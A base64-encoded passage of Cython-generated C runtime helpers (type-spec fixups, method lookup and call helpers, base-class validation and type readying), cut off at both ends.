AgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpO1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpO1xuICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF93ZWFrbGlzdG9mZnNldCA9IG1lbWItPm9mZnNldDtcbiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGVsc2UgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX19kaWN0b2Zmc2V0X18iKSA9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT50eXBlID09IFRfUFlTU0laRVQpO1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gUkVBRE9OTFkpO1xuICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF9kaWN0b2Zmc2V0ID0gbWVtYi0+b2Zmc2V0O1xuICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTtcbiAgICAgICAgICAgICAgICB9XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fdmVjdG9yY2FsbG9mZnNldF9fIikgPT0gMCkge1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+dHlwZSA9PSBUX1BZU1NJWkVUKTtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IFJFQURPTkxZKTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0XG4gICAgICAgICAgICAgICAgICAgIHR5cGUtPnRwX3ZlY3RvcmNhbGxfb2Zmc2V0ID0gbWVtYi0+b2Zmc2V0O1xuI2Vsc2VcbiAgICAgICAgICAgICAgICAgICAgdHlwZS0+dHBfcHJpbnQgPSAocHJpbnRmdW5jKSBtZW1iLT5vZmZzZXQ7XG4jZW5kaWZcbiAgICAgICAgICAgICAgICAgICAgY2hhbmdlZCA9IDE7XG4gICAgICAgICAgICAgICAgfVxuI2VuZGlmICAvLyBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAgICAgICAgICAgICBlbHNlIGlmIChzdHJjbXAobWVtYi0+bmFtZSwgIl9fbW9kdWxlX18iKSA9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkZXNjcjtcbiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9PQkpFQ1QpO1xuICAgICAgICAgICAgICAgICAgICBhc3NlcnQobWVtYi0+ZmxhZ3MgPT0gMCB8fCBtZW1iLT5mbGFncyA9PSBSRUFET05MWSk7XG4gICAgICAgICAgICAgICAgICAgIGRlc2NyID0gUHlEZXNjcl9OZXdNZW1iZXIodHlwZSwgbWVtYik7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGVzY3IpKVxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAgICAgICAgICAgICBpbnQgc2V0X2l0ZW1fcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHlwZS0+dHBfZGljdCwgUHlEZXNjcl9OQU1FKGRlc2NyKSwgZGVzY3IpO1xuICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpO1xuICAgICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2V0X2l0ZW1fcmVzdWx0IDwgMCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTtcbiAgICAgICAgICAgICAgICB9XG4jZW5kaWYgIC8vICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIG1lbWIrKztcbiAgICAgICAgfVxuICAgIH1cbiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgc2xvdCA9IHNwZWMtPnNsb3RzO1xuICAgIHdoaWxlIChzbG90ICYmIHNsb3QtPnNsb3QgJiYgc2xvdC0+c2xvdCAhPSBQeV90cF9nZXRzZXQpXG4gICAgICAgIHNsb3QrKztcbiAgICBpZiAoc2xvdCAmJiBzbG90LT5zbG90ID09IFB5X3RwX2dldHNldCkge1xuICAgICAgICBQeUdldFNldERlZiAqZ2V0c2V0ID0gKFB5R2V0U2V0RGVmKikgc2xvdC0+cGZ1bmM7XG4gICAgICAgIHdoaWxlIChnZXRzZXQgJiYgZ2V0c2V0LT5uYW1lKSB7XG4gICAgICAgICAgICBpZiAoZ2V0c2V0LT5uYW1lWzBdID09IFwnX1wnICYmIGdldHNldC0+bmFtZVsxXSA9PSBcJ19cJyAmJiBzdHJjbXAoZ2V0c2V0LT5uYW1lLCAiX19tb2R1bGVfXyIpID09IDApIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGVzY3IgPSBQeURlc2NyX05ld0dldFNldCh0eXBlLCBnZXRzZXQpO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGVzY3IpKVxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgICAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqcHluYW1lID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoZ2V0c2V0LT5uYW1lKTtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5bmFtZSkpIHtcbiAgICAgICAgICAgICAgICAgICAgUHlfREVDUkVGKGRlc2NyKTtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBpbnQgc2V0X2l0ZW1fcmVzdWx0ID0gX19QeXhfU2V0SXRlbU9uVHlwZURpY3QodHlwZSwgcHluYW1lLCBkZXNjcik7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHB5bmFtZSk7XG4gICAgICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgICAgICBDWVRIT05fVU5VU0VEX1ZBUihfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QpO1xuICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0eXBlLT50cF9kaWN0LCBQeURlc2NyX05BTUUoZGVzY3IpLCBkZXNjcik7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGRlc2NyKTtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoc2V0X2l0ZW1fcmVzdWx0IDwgMCkpIHtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICsrZ2V0c2V0O1xuICAgICAgICB9XG4gICAgfVxuI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICAgaWYgKGNoYW5nZWQpXG4gICAgICAgIFB5VHlwZV9Nb2RpZmllZCh0eXBlKTtcbiNlbmRpZiAgLy8gUFlfVkVSU0lPTl9IRVggPiAweDAzMDkwMEIxXG4gICAgcmV0dXJuIDA7XG59XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhQeU9iamVjdCAqZnVuYykge1xuICAgIFB5T2JqZWN0ICphcmdbMl0gPSB7TlVMTCwgTlVMTH07XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmMsIGFyZyArIDEsIDAgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqKm1ldGhvZCkge1xuICAgIFB5T2JqZWN0ICphdHRyO1xuI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAmJiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQXG4gICAgX19QeXhfVHlwZU5hbWUgdHlwZV9uYW1lO1xuICAgIFB5VHlwZU9iamVjdCAqdHAgPSBQeV9UWVBFKG9iaik7XG4gICAgUHlPYmplY3QgKmRlc2NyO1xuICAgIGRlc2NyZ2V0ZnVuYyBmID0gTlVMTDtcbiAgICBQeU9iamVjdCAqKmRpY3RwdHIsICpkaWN0O1xuICAgIGludCBtZXRoX2ZvdW5kID0gMDtcbiAgICBhc3NlcnQgKCptZXRob2QgPT0gTlVMTCk7XG4gICAgaWYgKHVubGlrZWx5KHRwLT50cF9nZXRhdHRybyAhPSBQeU9iamVjdF9HZW5lcmljR2V0QXR0cikpIHtcbiAgICAgICAgYXR0ciA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBuYW1lKTtcbiAgICAgICAgZ290byB0cnlfdW5wYWNrO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkodHAtPnRwX2RpY3QgPT0gTlVMTCkgJiYgdW5saWtlbHkoUHlUeXBlX1JlYWR5KHRwKSA8IDApKSB7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICBkZXNjciA9IF9QeVR5cGVfTG9va3VwKHRwLCBuYW1lKTtcbiAgICBpZiAobGlrZWx5KGRlc2NyICE9IE5VTEwpKSB7XG4gICAgICAgIFB5X0lOQ1JFRihkZXNjcik7XG4jaWYgZGVmaW5lZChQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SKSAmJiBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SXG4gICAgICAgIGlmIChfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKGRlc2NyKSwgUHlfVFBGTEFHU19NRVRIT0RfREVTQ1JJUFRPUikpXG4jZWxzZVxuICAgICAgICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4gICAgICAgIGlmIChsaWtlbHkoUHlGdW5jdGlvbl9DaGVjayhkZXNjcikgfHwgX19QeXhfSVNfVFlQRShkZXNjciwgJlB5TWV0aG9kRGVzY3JfVHlwZSkgfHwgX19QeXhfQ3lGdW5jdGlvbl9DaGVjayhkZXNjcikpKVxuICAgICAgICAjZWxzZVxuICAgICAgICBpZiAobGlrZWx5KFB5RnVuY3Rpb25fQ2hlY2soZGVzY3IpIHx8IF9fUHl4X0lTX1RZUEUoZGVzY3IsICZQeU1ldGhvZERlc2NyX1R5cGUpKSlcbiAgICAgICAgI2VuZGlmXG4jZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgICAgbWV0aF9mb3VuZCA9IDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBmID0gUHlfVFlQRShkZXNjciktPnRwX2Rlc2NyX2dldDtcbiAgICAgICAgICAgIGlmIChmICE9IE5VTEwgJiYgUHlEZXNjcl9Jc0RhdGEoZGVzY3IpKSB7XG4gICAgICAgICAgICAgICAgYXR0ciA9IGYoZGVzY3IsIG9iaiwgKFB5T2JqZWN0ICopUHlfVFlQRShvYmopKTtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpO1xuICAgICAgICAgICAgICAgIGdvdG8gdHJ5X3VucGFjaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgIH1cbiAgICBkaWN0cHRyID0gX1B5T2JqZWN0X0dldERpY3RQdHIob2JqKTtcbiAgICBpZiAoZGljdHB0ciAhPSBOVUxMICYmIChkaWN0ID0gKmRpY3RwdHIpICE9IE5VTEwpIHtcbiAgICAgICAgUHlfSU5DUkVGKGRpY3QpO1xuICAgICAgICBhdHRyID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIoZGljdCwgbmFtZSk7XG4gICAgICAgIGlmIChhdHRyICE9IE5VTEwpIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihhdHRyKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihkaWN0KTtcbiAgICAgICAgICAgIFB5X1hERUNSRUYoZGVzY3IpO1xuICAgICAgICAgICAgZ290byB0cnlfdW5wYWNrO1xuICAgICAgICB9XG4gICAgICAgIFB5X0RFQ1JFRihkaWN0KTtcbiAgICB9XG4gICAgaWYgKG1ldGhfZm91bmQpIHtcbiAgICAgICAgKm1ldGhvZCA9IGRlc2NyO1xuICAgICAgICByZXR1cm4gMTtcbiAgICB9XG4gICAgaWYgKGYgIT0gTlVMTCkge1xuICAgICAgICBhdHRyID0gZihkZXNjciwgb2JqLCAoUHlPYmplY3QgKilQeV9UWVBFKG9iaikpO1xuICAgICAgICBQeV9ERUNSRUYoZGVzY3IpO1xuICAgICAgICBnb3RvIHRyeV91bnBhY2s7XG4gICAgfVxuICAgIGlmIChsaWtlbHkoZGVzY3IgIT0gTlVMTCkpIHtcbiAgICAgICAgKm1ldGhvZCA9IGRlc2NyO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZSh0cCk7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX0F0dHJpYnV0ZUVycm9yLFxuICAgICAgICAgICAgICAgICAiXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgb2JqZWN0IGhhcyBubyBhdHRyaWJ1dGUgXCclVVwnIixcbiAgICAgICAgICAgICAgICAgdHlwZV9uYW1lLCBuYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUodHlwZV9uYW1lKTtcbiAgICByZXR1cm4gMDtcbiNlbHNlXG4gICAgYXR0ciA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIob2JqLCBuYW1lKTtcbiAgICBnb3RvIHRyeV91bnBhY2s7XG4jZW5kaWZcbnRyeV91bnBhY2s6XG4jaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKGxpa2VseShhdHRyKSAmJiBQeU1ldGhvZF9DaGVjayhhdHRyKSAmJiBsaWtlbHkoUHlNZXRob2RfR0VUX1NFTEYoYXR0cikgPT0gb2JqKSkge1xuICAgICAgICBQeU9iamVjdCAqZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oYXR0cik7XG4gICAgICAgIFB5X0lOQ1JFRihmdW5jdGlvbik7XG4gICAgICAgIFB5X0RFQ1JFRihhdHRyKTtcbiAgICAgICAgKm1ldGhvZCA9IGZ1bmN0aW9uO1xuICAgICAgICByZXR1cm4gMTtcbiAgICB9XG4jZW5kaWZcbiAgICAqbWV0aG9kID0gYXR0cjtcbiAgICByZXR1cm4gMDtcbn1cblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBtZXRob2RfbmFtZSkge1xuI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKVxuICAgIFB5T2JqZWN0ICphcmdzWzFdID0ge29ian07XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZDtcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZztcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnO1xuICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG1ldGhvZF9uYW1lLCBhcmdzLCAxIHwgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBOVUxMKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKm1ldGhvZCA9IE5VTEwsICpyZXN1bHQgPSBOVUxMO1xuICAgIGludCBpc19tZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Qob2JqLCBtZXRob2RfbmFtZSwgJm1ldGhvZCk7XG4gICAgaWYgKGxpa2VseShpc19tZXRob2QpKSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcobWV0aG9kLCBvYmopO1xuICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKSBnb3RvIGJhZDtcbiAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcobWV0aG9kKTtcbiAgICBQeV9ERUNSRUYobWV0aG9kKTtcbmJhZDpcbiAgICByZXR1cm4gcmVzdWx0O1xuI2VuZGlmXG59XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9VU0VfVFlQRV9TUEVDU1xuc3RhdGljIGludCBfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZShjb25zdCBjaGFyICp0eXBlX25hbWUsIFB5X3NzaXplX3QgZGljdG9mZnNldCwgUHlPYmplY3QgKmJhc2VzKSB7XG4gICAgUHlfc3NpemVfdCBpLCBuO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUoYmFzZXMpO1xuI2Vsc2VcbiAgICBuID0gUHlUdXBsZV9TaXplKGJhc2VzKTtcbiAgICBpZiAodW5saWtlbHkobiA8IDApKSByZXR1cm4gLTE7XG4jZW5kaWZcbiAgICBmb3IgKGkgPSAxOyBpIDwgbjsgaSsrKVxuICAgIHtcbiAgICAgICAgUHlUeXBlT2JqZWN0ICpiO1xuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIFB5T2JqZWN0ICpiMCA9IFB5U2VxdWVuY2VfR2V0SXRlbShiYXNlcywgaSk7XG4gICAgICAgIGlmICghYjApIHJldHVybiAtMTtcbiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgUHlPYmplY3QgKmIwID0gUHlUdXBsZV9HRVRfSVRFTShiYXNlcywgaSk7XG4jZWxzZVxuICAgICAgICBQeU9iamVjdCAqYjAgPSBQeVR1cGxlX0dldEl0ZW0oYmFzZXMsIGkpO1xuICAgICAgICBpZiAoIWIwKSByZXR1cm4gLTE7XG4jZW5kaWZcbiAgICAgICAgYiA9IChQeVR5cGVPYmplY3QqKSBiMDtcbiAgICAgICAgaWYgKCFfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShiLCBQeV9UUEZMQUdTX0hFQVBUWVBFKSlcbiAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTtcbiAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgImJhc2UgY2xhc3MgXCciIF9fUHl4X0ZNVF9UWVBFTkFNRSAiXCcgaXMgbm90IGEgaGVhcCB0eXBlIiwgYl9uYW1lKTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShiX25hbWUpO1xuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICBQeV9ERUNSRUYoYjApO1xuI2VuZGlmXG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGRpY3RvZmZzZXQgPT0gMClcbiAgICAgICAge1xuICAgICAgICAgICAgUHlfc3NpemVfdCBiX2RpY3RvZmZzZXQgPSAwO1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICAgICAgICAgYl9kaWN0b2Zmc2V0ID0gYi0+dHBfZGljdG9mZnNldDtcbiNlbHNlXG4gICAgICAgICAgICBQeU9iamVjdCAqcHlfYl9kaWN0b2Zmc2V0ID0gUHlPYmplY3RfR2V0QXR0clN0cmluZygoUHlPYmplY3QqKWIsICJfX2RpY3RvZmZzZXRfXyIpO1xuICAgICAgICAgICAgaWYgKCFweV9iX2RpY3RvZmZzZXQpIGdvdG8gZGljdG9mZnNldF9yZXR1cm47XG4gICAgICAgICAgICBiX2RpY3RvZmZzZXQgPSBQeUxvbmdfQXNTc2l6ZV90KHB5X2JfZGljdG9mZnNldCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYocHlfYl9kaWN0b2Zmc2V0KTtcbiAgICAgICAgICAgIGlmIChiX2RpY3RvZmZzZXQgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkgZ290byBkaWN0b2Zmc2V0X3JldHVybjtcbiNlbmRpZlxuICAgICAgICAgICAgaWYgKGJfZGljdG9mZnNldCkge1xuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgX19QeXhfVHlwZU5hbWUgYl9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShiKTtcbiAgICAgICAgICAgICAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICJleHRlbnNpb24gdHlwZSBcJyUuMjAwc1wnIGhhcyBubyBfX2RpY3RfXyBzbG90LCAiXG4gICAgICAgICAgICAgICAgICAgICAgICAiYnV0IGJhc2UgdHlwZSBcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBoYXM6ICJcbiAgICAgICAgICAgICAgICAgICAgICAgICJlaXRoZXIgYWRkIFwnY2RlZiBkaWN0IF9fZGljdF9fXCcgdG8gdGhlIGV4dGVuc2lvbiB0eXBlICJcbiAgICAgICAgICAgICAgICAgICAgICAgICJvciBhZGQgXCdfX3Nsb3RzX18gPSBbLi4uXVwnIHRvIHRoZSBiYXNlIHR5cGUiLFxuICAgICAgICAgICAgICAgICAgICAgICAgdHlwZV9uYW1lLCBiX25hbWUpO1xuICAgICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoYl9uYW1lKTtcbiAgICAgICAgICAgICAgICB9XG4jaWYgIUNZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICAgICAgICAgICBkaWN0b2Zmc2V0X3JldHVybjpcbiNlbmRpZlxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGIwKTtcbiNlbmRpZlxuICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIFB5X0RFQ1JFRihiMCk7XG4jZW5kaWZcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG4jZW5kaWZcblxuXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX0hhc011bHRpcGxlSW5oZXJpdGFuY2UoUHlUeXBlT2JqZWN0ICp0KSB7XG4gICAgd2hpbGUgKHQpIHtcbiAgICAgICAgUHlPYmplY3QgKmJhc2VzID0gX19QeXhfUHlUeXBlX0dldFNsb3QodCwgdHBfYmFzZXMsIFB5T2JqZWN0Kik7XG4gICAgICAgIGlmIChiYXNlcykge1xuICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgIH1cbiAgICAgICAgdCA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopO1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUHlUeXBlX1JlYWR5KFB5VHlwZU9iamVjdCAqdCkge1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUyB8fCAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IGRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pXG4gICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gICAgKHZvaWQpX19QeXhfdmFsaWRhdGVfYmFzZXNfdHVwbGU7XG4jZW5kaWZcbiAgICByZXR1cm4gUHlUeXBlX1JlYWR5KHQpO1xuI2Vsc2VcbiAgICBpbnQgcjtcbiAgICBpZiAoIV9fUHl4X1B5VHlwZV9IYXNNdWx0aXBsZUluaGVyaXRhbmNlKHQpKSB7XG4gICAgICAgIHJldHVybiBQeVR5cGVfUmVhZHkodCk7XG4gICAgfVxuICAgIFB5T2JqZWN0ICpiYXNlcyA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KHQsIHRwX2Jhc2VzLCBQeU9iamVjdCopO1xuICAgIGlmIChiYXNlcyAmJiB1bmxpa2VseShfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZSh0LT50cF9uYW1lLCB0LT50cF9kaWN0b2Zmc2V0LCBiYXNlcykgPT0gLTEpKVxuICAgICAgICByZXR1cm4gLTE7XG4jaWYgIWRlZmluZWQoUFlTVE9OX01BSk9SX1ZFUlNJT04pXG4gICAge1xuICAgICAgICBpbnQgZ2Nfd2FzX2VuYWJsZWQ7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwYjFcbiAgICAgICAgZ2Nfd2FzX2VuYWJsZWQgPSBQeUdDX0Rpc2FibGUoKTtcbiAgICAgICAgKHZvaWQpX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDA7XG4gICAgI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnJldCwgKnB5X3N0YXR1cztcbiAgICAgICAgUHlPYmplY3QgKmdjID0gTlVMTDtcbiAgICAgICAgI2lmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0rMCA+PSAweDA3MDMwNDAwKSAmJlxcXG4gICAgICAgICAgICAgICAgIUNZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUxcbiAgICAgICAgZ2MgPSBQeUltcG9ydF9HZXRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkoIWdjKSkgZ2MgPSBQeUltcG9ydF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZ2MpKSByZXR1cm4gLTE7XG4gICAgICAgIHB5X3N0YXR1cyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxNZXRob2QwKGdjLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2lzZW5hYmxlZCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhdHVzKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgfVxuICAgICAgICBnY193YXNfZW5hYmxlZCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShweV9zdGF0dXMpO1xuICAgICAgICBQeV9ERUNSRUYocHlfc3RhdHVzKTtcbiAgICAgICAgaWYgKGdjX3dhc19lbmFibGVkID4gMCkge1xuICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoZ2MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZGlzYWJsZSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXJldCkpIHtcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZ2MpO1xuICAgICAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXQpO1xuICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGdjX3dhc19lbmFibGVkID09IC0xKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKGdjKTtcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgfVxuICAgICNlbmRpZlxuICAgICAgICB0LT50cF9mbGFncyB8PSBQeV9UUEZMQUdTX0hFQVBUWVBFO1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICAgICAgd